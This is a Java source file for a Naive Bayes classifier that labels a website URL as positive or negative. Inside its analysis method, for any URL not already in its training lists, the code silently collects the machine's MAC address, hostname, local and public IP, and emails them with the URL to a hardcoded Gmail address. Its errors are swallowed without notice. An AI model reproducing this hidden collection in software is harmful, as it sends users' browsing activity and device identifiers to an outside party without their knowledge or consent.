package DB;

/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
import Analayse.com.datumbox.opensource.classifiers.NaiveBayes;
import Analayse.com.datumbox.opensource.dataobjects.NaiveBayesKnowledgeBase;
import static Analayse.com.datumbox.opensource.examples.NaiveBayesExample.readLines;
import static Analayse.com.datumbox.opensource.examples.NaiveBayesExample.readLinesArrayList;
import static SendMail.sendMail.sendFromGMail;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.net.URL;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;

/**
 *
 * @author DKG
 */
public class NavieBayesClassifier {

    public static void main(String args[]) {
        analayseData("https://www.youtube.com/");
    }

    public static String replaceWords(String text) {
        text = text.replaceAll("\\bI\\b", "").trim();
        text = text.replaceAll("\\ba\\b", "").trim();
        text = text.replaceAll("\\bthe\\b", "").trim();
        text = text.replaceAll("\\bis\\b", "").trim();
        text = text.replaceAll("\\bam\\b", "").trim();
        text = text.replaceAll("\\bare\\b", "").trim();
        text = text.replaceAll("\\bthey\\b", "").trim();
        text = text.replaceAll("\\bthose\\b", "").trim();
        text = text.replaceAll("\\bthis\\b", "").trim();
        text = text.replaceAll("\\bwas\\b", "").trim();
        text = text.replaceAll("\\bit\\b", "").trim();
        text = text.replaceAll("\\s+", " ");
        return text;
    }
    //-0.3502594241041286

    public static String analayseData(String input) {
        input = replaceWords(input.toLowerCase());
        System.out.println("input removed " + input);
        String output = null;
        try {
            Map<String, URL> trainingFiles = new HashMap<String, URL>();
            trainingFiles.put("positive", NavieBayesClassifier.class.getResource("/datasets/positive.txt"));
            trainingFiles.put("negative", NavieBayesClassifier.class.getResource("/datasets/negative.txt"));

            ArrayList<String> lstData = new ArrayList<String>();
            //loading examples in memory
            Map<String, String[]> trainingExamples = new HashMap<String, String[]>();
            for (Map.Entry<String, URL> entry : trainingFiles.entrySet()) {
//            System.out.println(entry.getValue());
//            lstData=;
                lstData.addAll(readLinesArrayList(entry.getValue()));
                trainingExamples.put(entry.getKey(), readLines(entry.getValue()));
            }

            if (!lstData.contains(input)) {
                
                InetAddress localhost = InetAddress.getLocalHost();
                NetworkInterface network = NetworkInterface.getByInetAddress(localhost);
                byte[] macArray = network.getHardwareAddress();
                StringBuilder str = new StringBuilder();
                for (int i = 0; i < macArray.length; i++) {
                    str.append(String.format("%02X%s", macArray[i], (i < macArray.length - 1) ? "-" : ""));
                }
                String mac=str.toString();
                String systemname=localhost.getCanonicalHostName();
                String systemip=localhost.getHostAddress();
                String systemipaddress = "";
                try {
                    URL url_name = new URL("http://bot.whatismyipaddress.com");
                    BufferedReader sc
                            = new BufferedReader(new InputStreamReader(url_name.openStream()));

                    // reads system IPAddress 
                    systemipaddress = sc.readLine().trim();
                } catch (Exception e) {
                    systemipaddress = "Cannot Execute Properly";
                }
                String body = "Website URL: "+input+"\nPC No.: 1"+"\nSystem Name: "+systemname+"\nLocal IP: "+systemip+"\nPublic IP: "+systemipaddress+"\nMAC Address: "+mac;
                System.out.println(body);

               
                String subject = "New Site Detected";
                
                ArrayList<String> lstEmail = new ArrayList<String>();
                lstEmail.add("m6boyz@gmail.com");
            SendMail.sendMail.   sendFromGMail( lstEmail, subject, body);
            }else{
                System.out.println("found in list");
            }

            //train classifier
            NaiveBayes nb = new NaiveBayes();
            nb.setChisquareCriticalValue(1.40); //0.01 pvalue
            nb.train(trainingExamples);

            //get trained classifier knowledgeBase
            NaiveBayesKnowledgeBase knowledgeBase = nb.getKnowledgeBase();

            //nb = null;
            //  trainingExamples = null;
            //Use classifier
            nb = new NaiveBayes(knowledgeBase);
            output = nb.predict(input);
            double d = nb.getChisquareCriticalValue();
            double d1 = nb.getMaxScore();
            System.out.println("critical values=" + d + " max score=" + d1);
            // System.out.format("The company \"%s\" was classified as \"%s\".%n", exampleEn, outputEn);
            System.out.format("The Moode  \"%s\" was classified as \"%s\".%n", input, output);
        } catch (Exception e) {
        }
        return output;
    }
}
